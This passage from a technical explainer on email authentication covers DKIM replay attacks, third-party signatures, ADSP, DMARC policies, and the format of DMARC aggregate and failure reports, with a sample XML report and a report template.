Replay attacks for spamming
</summary>

  <p>By design, <abbr title="DomainKeys Identified Mail">DKIM</abbr> protects only the body and the selected header fields of a message
but not its <a href="#message-versus-envelope">envelope</a>.
If <abbr title="DomainKeys Identified Mail">DKIM</abbr> also covered the <a href="#diverging-envelope-example"><code>RCPT</code> <code>TO</code> addresses</a> of the envelope,
mail servers could no longer <a href="#email-forwarding">forward emails</a>
without breaking <a href="#domain-authentication">domain authentication</a>.
One of the reasons <a href="#why-outgoing-mail-servers">for using outgoing mail servers</a> is to allow mailbox providers
to <a href="https://en.wikipedia.org/wiki/Rate_limiting">limit the rate</a> at which their users can send emails.
The problem with <abbr title="DomainKeys Identified Mail">DKIM</abbr> is that any user can get a valid <abbr title="DomainKeys Identified Mail">DKIM</abbr> on a message of their choosing
by sending an email to themself.
Once they have received the email, they can relay the signed message to
<a href="https://datatracker.ietf.org/doc/html/rfc6376#section-8.6">an arbitrary number of recipients</a>.
The recipients might not see their email address in the <code>To</code> or <code>Cc</code> field,
but this is usually also the case for <code>Bcc</code> recipients.
The mailbox provider who signed the message can stop such a
<a href="https://en.wikipedia.org/wiki/Replay_attack">replay attack</a>
only by revoking the corresponding signing key.
If the mailbox provider doesn’t use
<a href="https://datatracker.ietf.org/doc/html/rfc6376#section-8.7">a different key for each user</a>,
which would increase the load on their <a href="https://en.wikipedia.org/wiki/Name_server">name servers</a> considerably,
revoking the key immediately prevents delayed emails of other users from being delivered as well.
Unless a key is compromised, it should be revoked only after around one week of no longer being in use.
Even if the mailbox provider did use a different key for each user,
it would first have to learn that a user abuses their <a href="#reputation">reputation</a> for <a href="#spam">spamming</a>.
A lot of damage might already have been done before the key is revoked and the change is propagated through the <abbr title="Domain Name System">DNS</abbr>.
The best that public mailbox providers can do to counter this attack is to reject outgoing messages
with a high <a href="#heuristics">spam score</a>.</p>

</details>

<details>
  <summary id="generating-the-signing-key">
Generating the signing key
</summary>

  <p>You can generate a <abbr title="DomainKeys Identified Mail">DKIM</abbr> signing key yourself with the following commands.
As far as I can tell, you can generate an <a href="https://datatracker.ietf.org/doc/html/rfc8032#section-5.1">ED25519</a>
key <a href="#openssl-versus-libressl">only with OpenSSL but not with LibreSSL</a>.
I covered how to install OpenSSL on macOS in an <a href="#install-openssl-on-macos">earlier box</a>.</p>

  
  

  <p>Copy the public key between <code>-----BEGIN PUBLIC KEY-----</code> and <code>-----END PUBLIC KEY-----</code>
into <a href="#tool-format-dkim">your <abbr title="DomainKeys Identified Mail">DKIM</abbr> record</a>.</p>

</details>

<details>
  

  <p>Many people and companies use a custom domain without running their mail servers themselves.
Instead, they delegate the delivery and the receipt of emails to mailbox providers.
<a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> makes such a delegation very easy with the <code>include</code> <a href="#spf-mechanisms">mechanism</a>,
which allows mailbox providers to change their outgoing mail servers without involving their customers.
If you want to achieve <a href="https://datatracker.ietf.org/doc/html/rfc6376#appendix-B.1.1">the same with <abbr title="DomainKeys Identified Mail">DKIM</abbr></a>,
you have to delegate a <a href="https://en.wikipedia.org/wiki/DNS_zone"><abbr title="Domain Name System">DNS</abbr> zone</a>
in the <code>_domainkey</code> subdomain to your mailbox provider.
The next best thing is to configure a <a href="https://en.wikipedia.org/wiki/CNAME_record"><code>CNAME</code> record</a>
in this subdomain which points to the <abbr title="DomainKeys Identified Mail">DKIM</abbr> record of the mailbox provider.
<a href="#protecting-subdomains">Once again</a>,
the standard doesn’t mention whether <code>CNAME</code> records can be used, but this seems to be
<a href="https://docs.gandi.net/en/gandimail/faq/spoofing.html#dkim">a common practice</a>.
With this approach, the mailbox provider cannot change the selector of their signing key
without involving their customers, but if you set up several <code>CNAME</code> records,
the mailbox provider can alternate between them.</p>

  <p><a href="https://datatracker.ietf.org/doc/html/rfc6541"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6541</a> introduces a simpler solution,
which is called Authorized Third-Party Signatures (<abbr title="Authorized Third-Party Signatures">ATPS</abbr>).
It adds an additional tag with the name <code>atps</code> to the <a href="#dkim-signature-header-field"><code>DKIM-Signature</code> header field</a>,
which can be used to indicate a domain on whose behalf the message is signed.
The delegator confirms the delegation with a <code>TXT</code> record at <code>{DelegateeDomain}._atps.{DelegatorDomain}</code>,
which must have a value of <code>v=ATPS1</code>.
For example, if the domain of your organization is <code>example.org</code> and you use the email service of <code>example.com</code>,
your mailbox provider adds a <code>DKIM-Signature</code> header field with <code>d=example.com</code> and <code>atps=example.org</code>.
The verifier then checks whether there is a valid <abbr title="Authorized Third-Party Signatures">ATPS</abbr> record at <code>example.com._atps.example.org</code>.
So far, so good.</p>

  <p>What makes <abbr title="Authorized Third-Party Signatures">ATPS</abbr> unnecessarily complicated is that the <code>DelegateeDomain</code> can be hashed.
The <a href="https://datatracker.ietf.org/doc/html/rfc6541#section-4.1">argument for this</a> is to force the subdomain to a fixed length
so that arbitrarily long third-party domain names can be prepended to the <code>DelegatorDomain</code>
while remaining below <a href="https://datatracker.ietf.org/doc/html/rfc1035#section-2.3.4">255 characters</a>.
Yet another tag with the name <code>atpsh</code> is added to the <code>DKIM-Signature</code> header field to indicate the used hash function.
In the previous example, which doesn’t use hashing, the tag is <code>atpsh=none</code>.
If the <code>DelegateeDomain</code> is hashed, which is indicated with <code>atps=sha256</code>,
the hash is encoded with <a href="https://en.wikipedia.org/wiki/Base32">Base32</a>
according to <a href="https://datatracker.ietf.org/doc/html/rfc4648#section-6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 4648</a>.
Since Base32 uses only the capital letters from <code>A</code> to <code>Z</code> and the numbers from <code>2</code> to <code>7</code>,
the encoding is better suited than <a href="#content-encoding">Base64</a> for case-insensitive domain names.
You find an example with hashing in <a href="https://datatracker.ietf.org/doc/html/rfc6541#appendix-A">Appendix A of <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6541</a>.
The <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> itself is labeled as <a href="https://datatracker.ietf.org/doc/html/rfc2026#section-4.2.1">experimental</a>
and I have no idea whether anyone actually uses <abbr title="Authorized Third-Party Signatures">ATPS</abbr>.</p>

</details>

<details>
  <summary id="author-domain-signing-practices">
Author Domain Signing Practices (<abbr title="Author Domain Signing Practices">ADSP</abbr>)
</summary>

  <p>I said <a href="#domain-authentication">earlier</a> that the recipient cannot know
whether the sender uses <abbr title="DomainKeys Identified Mail">DKIM</abbr> when they receive a message without a <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature.
At least historically, a domain owner could indicate that all emails are signed with the now deprecated
<a href="https://en.wikipedia.org/wiki/Author_Domain_Signing_Practices">Author Domain Signing Practices (<abbr title="Author Domain Signing Practices">ADSP</abbr>)</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc5617"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5617</a>
by configuring a <code>TXT</code> record with a content of <code>dkim=all</code> at the <code>_adsp._domainkey</code> subdomain.
Since <abbr title="Author Domain Signing Practices">ADSP</abbr> is no longer in use, you don’t have to configure such a record at your domains.</p>

</details>

<h4 id="domain-based-message-authentication-reporting-and-conformance">Domain-based Message Authentication, Reporting, and Conformance (<abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>)</h4>

<p>Increasing the security of a decentralized system is always difficult because enforcing
new requirements prematurely disrupts the <a href="#reliable-delivery-availability">reliability</a> of the system.
In order to minimize the disruption for users, all changes to the system
have to be <a href="https://en.wikipedia.org/wiki/Backward_compatibility">backward compatible</a>.
As we will see in the <a href="#transport-security">next section</a>,
some improvements involve only two parties.
Email authentication, on the other hand, involves many parties
and is, therefore, quite difficult to deploy.
To authenticate emails, the outgoing mail server of the sender has to implement
<a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> and/or <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a>,
email forwarders may not break the authentication,
and the incoming mail server of the recipient has to verify the authentication.
It makes sense to authenticate emails only if unauthentic emails are somehow penalized.
In the short term, this could mean that unauthentic emails are quarantined as potential spam.
In the long term, the goal should be to reject or discard all unauthentic emails
even if they are delivered by a <a href="#reputation">reputable mail server</a>.
While it is always up to the mail system of the recipient to decide what to do with incoming messages,
it can enforce domain authentication only if just a small percentage of legitimate mail is affected by it.
<a href="https://en.wikipedia.org/wiki/DMARC">Domain-based Message Authentication, Reporting, and Conformance (<abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>)</a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc7489"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7489</a>,
allows domain owners to deploy <a href="#domain-authentication">domain authentication</a> gradually,
to monitor its effect on the delivery of their emails,
to detect overlooked sources of legitimate mail,
and to ask for strict enforcement when the amount of disruption seems acceptable.</p>

<p>There are three aspects to understanding <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>:</p>
<ul>
  <li><strong>Authentication</strong>: A message is considered to be authentic if the domain of the <code>From</code> address
matches the <abbr title="Sender Policy Framework">SPF</abbr>-authenticated domain of the <code>MAIL</code> <code>FROM</code> address or the domain of a valid <abbr title="DomainKeys Identified Mail">DKIM</abbr> signature.
The owner of the sending domain can require the matching to be <code>strict</code>,
in which case the domains have to be identical, or <code>relaxed</code>,
in which case only the <a href="#organizational-domain">organizational domains</a>
after removing any subdomains have to be the same.
This is known as <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-3.1">identifier alignment</a>,
and the alignment can be configured separately for <abbr title="Sender Policy Framework">SPF</abbr> and <abbr title="DomainKeys Identified Mail">DKIM</abbr>.
If the <code>From</code> field consists of several addresses,
which is valid according to <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3.6.2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>,
the recipient can either reject the message or authenticate all domains and
<a href="https://datatracker.ietf.org/doc/html/rfc7489#section-6.6.1">apply the most strict policy</a> among the unauthentic domains.</li>
  <li><strong>Reports</strong>: Domain owners can ask receiving mail servers to send them <a href="#aggregate-reports">aggregate reports</a>
in regular intervals and <a href="#failure-reports">failure reports</a> for messages which failed authentication.
These <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> reports allow domain owners to monitor their deployment of domain authentication,
to detect unauthorized sources of legitimate messages, such as webshops
and <a href="https://en.wikipedia.org/wiki/Continuous_integration">continuous integration systems</a>,
and to be informed immediately when their domain is abused for phishing.</li>
  <li><strong>Policies</strong>: Domain owners can specify how receiving mail servers shall handle unauthentic messages.
If your domain doesn’t yet have a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record (see <a href="#tool-format-dmarc">below</a>),
you should start with aggregate reports and a domain policy of <code>none</code>.
This allows you to be informed about authentication failures
without affecting how unauthentic messages are handled.
Once you’re confident that you’ve authorized all legitimate sources of email with <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a>,
you should set the domain policy to <code>quarantine</code>,
which requests receiving mail servers to treat unauthentic emails as suspicious.
Since it’s not under your control whether your recipients use <a href="#alias-address">alias addresses</a>,
you should move to the <code>reject</code> policy only once you’ve also deployed <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a>.
Otherwise, your messages might not even reach the spam folder of your recipients
if they use <a href="#email-forwarding">email forwarding</a>.</li>
</ul>

<p>Domain owners publish their preferences in a <code>TXT</code> record at <code>_dmarc.{Domain}</code>.
The following two tools help you generate and validate the <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record for your domain.
Given the remarks above, most parameters should be self-explanatory.
If this is not the case, you can hover your mouse over them to read a short description.
All options are also documented in <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-6.3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7489</a>, of course.
Domains which aren’t used to send emails from should have a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record of <code>v=DMARC1;</code> <code>p=reject</code>.
If you want to be informed about spoofing attempts, you can also include a reporting address.
The second tool uses <a href="https://developers.google.com/speed/public-dns/docs/doh/json">Google’s <abbr title="Domain Name System">DNS</abbr> <abbr title="Application Programming Interface">API</abbr></a>
to query the <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record of the given domain.
If it finds a record, it loads its content into the first tool
to make it easier to analyze and modify existing records.
Even if you use the first tool to generate your <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record,
you should check your record with the second tool as there are still many mistakes that you can make.
For example, if reports shall be sent to a different domain,
the report receiver has to <a href="#report-approval">approve this</a>.
Another example is that the <a href="#subdomain-policy">subdomain policy</a> has an effect only
in <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> records of <a href="#organizational-domain">organizational domains</a>.
The second tool performs more than twenty such checks and warns you about potential configuration errors.</p>




<details>
  <summary id="organizational-domain">
Organizational domain
</summary>

  <p>An <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-3.2">organizational domain</a> is a domain
which is registered with a <a href="https://en.wikipedia.org/wiki/Domain_name_registrar">domain name registrar</a>.
For example, the organizational domain of <code>support.example.com</code> is <code>example.com</code>.
While <a href="https://en.wikipedia.org/wiki/Second-level_domain">second-level domains</a> can be registered
for many <a href="https://en.wikipedia.org/wiki/Top-level_domain">top-level domains</a>,
some <a href="https://en.wikipedia.org/wiki/Country_code_top-level_domain">country-code top-level domains</a> have
<a href="https://en.wikipedia.org/wiki/Second-level_domain#Country-code_second-level_domains">special second-level domains</a>.
An example of this is the <a href="https://en.wikipedia.org/wiki/.uk"><code>.uk</code> domain</a>,
which has special second-level domains, such as <code>.co.uk</code> and <code>.org.uk</code>.
Unfortunately, <abbr title="Domain Name System">DNS</abbr> doesn’t provide a mechanism to determine
which domains were registered by a different organization.
In particular, <a href="https://en.wikipedia.org/wiki/SOA_record"><code>SOA</code> records</a>
are <a href="https://datatracker.ietf.org/doc/html/rfc7489#appendix-A.6">not always used at administrative boundaries</a>.
Therefore, the organizational domain has to be determined by consulting a list of all known public suffixes
and keeping one label more than the longest suffix found in the list.
The most popular <a href="https://en.wikipedia.org/wiki/Public_Suffix_List">public suffix list (<abbr title="Public Suffix List">PSL</abbr>)</a>
is maintained by the <a href="https://en.wikipedia.org/wiki/Mozilla_Foundation">Mozilla Foundation</a>
and available <a href="https://publicsuffix.org/list/">here</a>.
If different mailbox providers use different lists,
they can come to different conclusions whether two identifiers align.
In order not to add <a href="https://www.npmjs.com/package/psl">another big dependency</a>,
the above tool determines the organizational domain by looking for the closest <code>SOA</code> record.</p>

</details>

<details>
  <summary id="subdomain-policy">
Subdomain policy
</summary>

  <p>Incoming mail servers query the <code>_dmarc</code> subdomain of the domain in the <code>From</code> address first.
If a <code>TXT</code> record starting with <code>v=DMARC1;</code> is found,
the message is handled according to the domain policy found in the mandatory <code>p</code> tag.
If no such record is found, they have to query the <code>_dmarc</code> subdomain
of the <a href="#organizational-domain">organizational domain</a> next.
If a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record is found, the message is handled according to the subdomain policy found
in the optional <code>sp</code> tag or according to the domain policy if no subdomain policy is specified.
For example, if there is a <code>TXT</code> record of <code>v=DMARC1; p=none; sp=reject</code> at <code>_dmarc.example.com</code>,
emails from <code>user@example.com</code> are handled according to the <code>none</code> policy
while emails from <code>user@support.example.com</code> are handled according to the <code>reject</code> policy,
assuming that no <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record exists at <code>_dmarc.support.example.com</code>.
If such a record does exist, emails from <code>user@support.example.com</code> are handled
according to the policy specified in the <code>p</code> tag of this record.
This is why subdomain policies have an effect only
when specified in the <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record of an organizational domain.
The alternative approach of removing one subdomain after another until a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record is found
<a href="https://datatracker.ietf.org/doc/html/rfc7489#appendix-A.6">was considered and rejected</a>
because this would allow a malicious sender to trigger dozens of <abbr title="Domain Name System">DNS</abbr> requests on the incoming mail server.</p>

</details>

<details>
  <summary id="unix-time">
Unix time
</summary>

  <p><a href="https://en.wikipedia.org/wiki/Unix_time">Unix time</a> is the number of seconds since 1970-01-01 at 00:00:00
<a href="https://en.wikipedia.org/wiki/Coordinated_Universal_Time">Coordinated Universal Time (<abbr title="Coordinated Universal Time">UTC</abbr>)</a>
without <a href="https://en.wikipedia.org/wiki/Leap_second">leap seconds</a>
so that every day contains exactly 86’400 seconds.
Unix time is used where a concise date format is desirable.
The following tool converts between unix time and the widely used
<a href="https://en.wikipedia.org/wiki/Gregorian_calendar">Gregorian calendar</a>.</p>

  

</details>

<details>
  <summary id="aggregate-reports">
Aggregate reports
</summary>

  <p>Incoming mail servers which support <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> send <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.2">aggregate reports</a>
to the addresses specified in the <code>rua</code> tag of the sender’s <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record in regular intervals.
If no <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record is found for the domain in the <code>From</code> address,
they look for a <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record at the sender’s <a href="#organizational-domain">organizational domain</a>.
Aggregate reports are structured with the <a href="https://en.wikipedia.org/wiki/XML">Extensible Markup Language (<abbr title="Extensible Markup Language">XML</abbr>)</a>
according to <a href="https://datatracker.ietf.org/doc/html/rfc7489#appendix-C">this schema</a>.
They contain information about how many emails the submitter received from which <abbr title="Internet Protocol">IP</abbr> addresses
and whether these messages passed <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication
– but not whether these messages were actually delivered.
Spammers can also configure <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> records
and you don’t want to give them insights into the effectiveness of their campaigns.
An aggregate report looks as follows:</p>

  <figure>

    <div><div><pre><code><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;</span>
<span>&lt;feedback&gt;</span>
  <span>&lt;report_metadata&gt;</span>
    <span>&lt;org_name&gt;</span>google.com<span>&lt;/org_name&gt;</span>
    <span>&lt;email&gt;</span>noreply-dmarc-support@google.com<span>&lt;/email&gt;</span>
    <span>&lt;extra_contact_info&gt;</span>https://support.google.com/a/answer/2466580<span>&lt;/extra_contact_info&gt;</span>
    <span>&lt;report_id&gt;</span>4027243601387366635<span>&lt;/report_id&gt;</span>
    <span>&lt;date_range&gt;</span>
      <span>&lt;begin&gt;</span>1582588800<span>&lt;/begin&gt;</span>
      <span>&lt;end&gt;</span>1582675199<span>&lt;/end&gt;</span>
    <span>&lt;/date_range&gt;</span>
  <span>&lt;/report_metadata&gt;</span>
  <span>&lt;policy_published&gt;</span>
    <span>&lt;domain&gt;</span>ef1p.com<span>&lt;/domain&gt;</span>
    <span>&lt;adkim&gt;</span>s<span>&lt;/adkim&gt;</span>
    <span>&lt;aspf&gt;</span>s<span>&lt;/aspf&gt;</span>
    <span>&lt;p&gt;</span>none<span>&lt;/p&gt;</span>
    <span>&lt;sp&gt;</span>reject<span>&lt;/sp&gt;</span>
    <span>&lt;pct&gt;</span>100<span>&lt;/pct&gt;</span>
  <span>&lt;/policy_published&gt;</span>
  <span>&lt;record&gt;</span>
    <span>&lt;row&gt;</span>
      <span>&lt;source_ip&gt;</span>198.2.140.132<span>&lt;/source_ip&gt;</span>
      <span>&lt;count&gt;</span>1<span>&lt;/count&gt;</span>
      <span>&lt;policy_evaluated&gt;</span>
        <span>&lt;disposition&gt;</span>none<span>&lt;/disposition&gt;</span>
        <span>&lt;dkim&gt;</span>pass<span>&lt;/dkim&gt;</span>
        <span>&lt;spf&gt;</span>fail<span>&lt;/spf&gt;</span>
      <span>&lt;/policy_evaluated&gt;</span>
    <span>&lt;/row&gt;</span>
    <span>&lt;identifiers&gt;</span>
      <span>&lt;header_from&gt;</span>ef1p.com<span>&lt;/header_from&gt;</span>
    <span>&lt;/identifiers&gt;</span>
    <span>&lt;auth_results&gt;</span>
      <span>&lt;dkim&gt;</span>
        <span>&lt;domain&gt;</span>gmail.mctxapp.net<span>&lt;/domain&gt;</span>
        <span>&lt;result&gt;</span>pass<span>&lt;/result&gt;</span>
        <span>&lt;selector&gt;</span>k1<span>&lt;/selector&gt;</span>
      <span>&lt;/dkim&gt;</span>
      <span>&lt;dkim&gt;</span>
        <span>&lt;domain&gt;</span>ef1p.com<span>&lt;/domain&gt;</span>
        <span>&lt;result&gt;</span>pass<span>&lt;/result&gt;</span>
        <span>&lt;selector&gt;</span>k1<span>&lt;/selector&gt;</span>
      <span>&lt;/dkim&gt;</span>
      <span>&lt;spf&gt;</span>
        <span>&lt;domain&gt;</span>mail12.mcsignup.com<span>&lt;/domain&gt;</span>
        <span>&lt;result&gt;</span>pass<span>&lt;/result&gt;</span>
      <span>&lt;/spf&gt;</span>
    <span>&lt;/auth_results&gt;</span>
  <span>&lt;/record&gt;</span>
<span>&lt;/feedback&gt;</span>
</code></pre></div>    </div>

    <figcaption>

An aggregate report, which was triggered by a <a href="https://mailchimp.com/">Mailchimp</a> signup and sent by Google.
As you can see, the message passed both <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr></a>
and <a href="#sender-policy-framework"><abbr title="Sender Policy Framework">SPF</abbr></a> authentication.
However, the <code>MAIL</code> <code>FROM</code> address didn’t align with the <code>From</code> address,
which caused <abbr title="Sender Policy Framework">SPF</abbr> to fail in the <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> evaluation.
As written <a href="#sender-policy-framework">earlier</a>,
this failure is intentional since Mailchimp wants to handle <a href="#bounce-messages">bounce messages</a> for you,
which prevents <abbr title="Sender Policy Framework">SPF</abbr> from aligning.

</figcaption>
  </figure>

  <p>At the time of writing, <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.2.1.1">email</a> is
<a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.2.1.2">the only transport mechanism</a> for <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> reports.
Aggregate reports should be compressed with <a href="https://en.wikipedia.org/wiki/Gzip">GZIP</a>
as specified in <a href="https://datatracker.ietf.org/doc/html/rfc1952"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1952</a> and sent as an attachment
with the filename <code>{RecipientDomain}!{SenderDomain}!{BeginTime}!{EndTime}[!{UniqueId}].xml[.gz]</code>
in an email with the subject <code>Report Domain: {SenderDomain} Submitter: {RecipientDomain} Report-ID: {ReportId}</code>.
All dates are provided in <a href="#unix-time">Unix time</a>.</p>

  <p>Since having compressed <abbr title="Extensible Markup Language">XML</abbr> files in your inbox isn’t very useful,
you want to use a service which aggregates the aggregate reports for you.
I use the <a href="https://dmarc.postmarkapp.com/"><abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> analyzer from Postmark</a> for my domains.
Once configured, you get a weekly email with insights into the sources which send emails on behalf of your domain
and the percentage of emails which passed <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication.
While the service provider learns neither the local part of email addresses nor the content of emails,
it learns how many emails were sent to which domains.
This is sensitive <a href="https://en.wikipedia.org/wiki/Metadata">metadata</a>,
which can disclose confidential business relations.</p>

</details>

<details>
  <summary id="failure-reports">
Failure reports
</summary>

  <p>The owner of a domain can ask incoming mail servers to send them a
<a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.3">failure report</a>
for each message that failed one or both authentication mechanisms.
Unlike <a href="#aggregate-reports">aggregate reports</a>, which are delivered periodically,
failure reports are sent right after an authentication failure
to the addresses in the <code>ruf</code> tag of the sender’s <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record.
This allows the domain owner to detect and address delivery problems quickly.
Since failure reports include either the complete unauthentic message or at least its header,
the domain owner can also analyze <a href="#phishing">phishing attempts</a> with a <a href="#spoofing">spoofed</a> <code>From</code> address.
In order to avert <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">denial-of-service attacks</a> on the domain owner,
incoming mail servers <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.3">are encouraged</a>
to either aggregate similar failures over short time periods or
<a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limit</a> failure reporting while discarding the remainder.</p>

  <p>The Authentication Failure Reporting Format (<abbr title="Authentication Failure Reporting Format">AFRF</abbr>), which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc6591"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6591</a>,
is currently <a href="https://www.iana.org/assignments/dmarc-parameters/dmarc-parameters.xhtml#report-format">the only format</a>
for <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> failure reports.
It is a <a href="https://www.iana.org/assignments/marf-parameters/marf-parameters.xml#marf-parameters-2">feedback type</a>
of the <a href="https://en.wikipedia.org/wiki/Abuse_Reporting_Format">Abuse Reporting Format (<abbr title="Abuse Reporting Format">ARF</abbr>)</a>,
which is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5965"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5965</a>.
The format is sometimes also called the Messaging Abuse Reporting Format (<abbr title="Messaging Abuse Reporting Format">MARF</abbr>),
which was the name of the <a href="https://tools.ietf.org/wg/marf/"><abbr title="Internet Engineering Task Force">IETF</abbr> working group</a>.
To make failure reports easy to read for machines, they are structured as follows:</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: multipart/report; boundary=&#34;UniqueBoundary&#34;

--UniqueBoundary
Content-Type: text/plain

This is an authentication failure report.

--UniqueBoundary
Content-Type: message/feedback-report

Feedback-Type: auth-failure
Identity-Alignment: [none|spf|dkim]
Original-Mail-From: attacker@example.com
Source-IP: 192.0.2.1
[…]

--UniqueBoundary
Content-Type: [message/rfc822|text/rfc822-headers]

From: attacker@example.com
To: victim@example.org
Subject: Your credit card is about to expire
[…]

--UniqueBoundary--
</code></pre></div>    </div>

    <figcaption>

The structure of failure reports.
<code>[A|B]</code> means either <code>A</code> or <code>B</code>, and <code>[…]</code> stands for more header fields.
<code>multipart/report</code> and <code>text/rfc822-headers</code> are specified in <a href="https://datatracker.ietf.org/doc/html/rfc6522"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6522</a>,
<code>message/rfc822</code> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.2.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2046</a>, and
<code>message/feedback-report</code> is specified in <a href="https://datatracker.ietf.org/doc/html/rfc5965#section-3"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5965</a>.
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a> maintains a list of
<a href="https://www.iana.org/assignments/marf-parameters/marf-parameters.xml#marf-parameters-1">feedback report header fields</a>.
The <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>-specific <code>Identity-Alignment</code> header field is defined
in <a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.3.1"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 7489</a>.

</figcaption>
  </figure>

  <p>As far as your privacy is concerned,
your mailbox provider has your message anyway if you submit it through the outgoing mail server.
If your message failed <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> authentication because you bypassed the outgoing mail server,
you shouldn’t have an expectation of privacy in the first place.
<abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr>’s failure reporting does increase the chance that your message is screened by an <abbr title="Information Technology">IT</abbr> administrator, though.
If you care about privacy,
you should use <a href="#comparison-of-smime-and-pgp"><abbr title="Secure/Multipurpose Internet Mail Extensions">S/MIME</abbr> or <abbr title="Pretty Good Privacy">PGP</abbr></a> for <a href="#end-to-end-security">end-to-end security</a>.</p>

</details>

<details>
  <summary id="report-approval">
Report approval
</summary>

  <p>Since <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> records are publicly visible and <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> reports can be large and frequent,
you should set up a dedicated mailbox or an <a href="#alias-address">alias address</a> to receive them.
In order to prevent bad actors from flooding a victim’s mailbox with unwanted reports
by listing his or her address in the <code>rua</code> or <code>ruf</code> tag of their <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record,
a receiving domain has to approve each domain for which it is willing to receive <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> reports
<a href="https://datatracker.ietf.org/doc/html/rfc7489#section-7.1">with a special <abbr title="Domain-based Message Authentication, Reporting &amp; Conformance">DMARC</abbr> record</a>
unless they belong to the same <a href="#organizational-domain">organizational domain</a>.
The content of such approval records is <a href="https://www.rfc-editor.org/errata/eid5440"><code>v=DMARC1;</code></a>,
and they are published as <code>TXT</code> records at <code>{PolicyDomain}._report._dmarc.{ReceivingDomain}</code>.
